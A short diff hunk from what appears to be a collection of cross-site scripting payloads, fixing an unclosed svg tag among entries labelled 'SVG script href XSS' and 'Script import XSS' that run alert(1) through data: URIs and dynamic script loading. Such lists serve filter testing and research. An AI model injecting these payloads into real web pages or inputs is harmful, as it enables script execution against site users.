@@ -44,7 +44,7 @@ document.head.appendChild(Object.assign(document.createElement('script'),{src:'/
 "></video>
 
 <!-- SVG script href XSS -->
-<svg><script href="data:text/javascript,alert(1)" />
+<svg><script href="data:text/javascript,alert(1)" /></svg>
 
 <!-- Script import XSS -->
 <script>import('data:text/javascript,alert(1)')</script>
